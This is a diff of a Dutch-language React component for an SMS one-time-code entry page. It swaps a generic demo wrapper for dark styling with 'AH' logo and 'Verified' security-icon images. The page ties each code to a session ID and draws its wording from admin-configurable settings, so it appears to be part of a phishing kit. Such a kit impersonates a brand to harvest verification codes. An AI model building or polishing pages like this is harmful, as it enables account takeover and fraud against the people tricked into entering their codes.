@@ -106,29 +106,33 @@ export function SmsClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <DemoShell title="SMS-verificatie">
-        <ConfigMissing />
-      </DemoShell>
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
+          <ConfigMissing />
+        </div>
+      </div>
     );
   }
 
   if (!sessionId) {
     return (
-      <DemoShell title="SMS-verificatie">
-        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
-          Ongeldige link.
-        </p>
-      </DemoShell>
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
+          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+            Ongeldige link.
+          </p>
+        </div>
+      </div>
     );
   }
 
   if (loading) {
     return (
-      <DemoShell title="SMS-verificatie">
-        <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
+          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
         </div>
-      </DemoShell>
+      </div>
     );
   }
 
@@ -137,43 +141,57 @@ export function SmsClient({ sessionId }: Props) {
   const displayText = customText || settings.sms_subtitle;
 
   return (
-    <DemoShell>
-      <div className="space-y-4 w-full mt-24 sm:mt-6">
-        <div className={ui.panel}>
-          <div className="text-center mb-6">
-            <h2 className="text-2xl font-bold text-gray-900">{settings.sms_title}</h2>
-            <p className="text-sm text-gray-600 mt-1 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
+    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+        
+        {/* Right Top Logo Placeholder */}
+        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
+          <img src="/ah-logo-transparent.png" alt="AH Logo" className="h-10 w-auto" id="sms-ah-logo" />
+        </div>
+
+        <div className="mb-6 flex items-start gap-4">
+          <div className="mt-1 shrink-0">
+            <img src="/ah-icon-security-transparent.png" alt="Verified" className="h-12 w-12" id="sms-verified-icon" />
           </div>
-          <form onSubmit={handleSubmit} className="space-y-5">
-          <label className="block text-sm font-bold text-zinc-800">
+          <div>
+            <h2 className="text-2xl font-bold text-white mb-1">{settings.sms_title}</h2>
+            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
+          </div>
+        </div>
+        
+        <form onSubmit={handleSubmit} className="space-y-5">
+          <label className="block text-sm font-medium text-white">
             {settings.sms_input_label} ({digits})
             <input
               required
               inputMode="numeric"
               autoComplete="one-time-code"
               maxLength={digits}
-              className={ui.input}
+              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-xl tracking-[0.35em] text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
               value={code}
               onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, digits))}
             />
           </label>
 
           {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-600">Voer exact {digits} cijfers in.</p>
+            <p className="text-xs text-red-400">Voer exact {digits} cijfers in.</p>
           ) : null}
 
-          {msg ? <p className="text-center text-sm text-[#003b8f]">{msg}</p> : null}
+          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
           <button
             type="submit"
             disabled={saving || !valid}
-            className={ui.submit}
+            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? settings.sms_loading : settings.sms_button}
           </button>
+
+          <p className="text-center text-xs text-gray-400 mt-4">
+            De code is per sms naar je mobiele nummer verzonden.
+          </p>
         </form>
-        </div>
       </div>
-    </DemoShell>
+    </div>
   );
 }
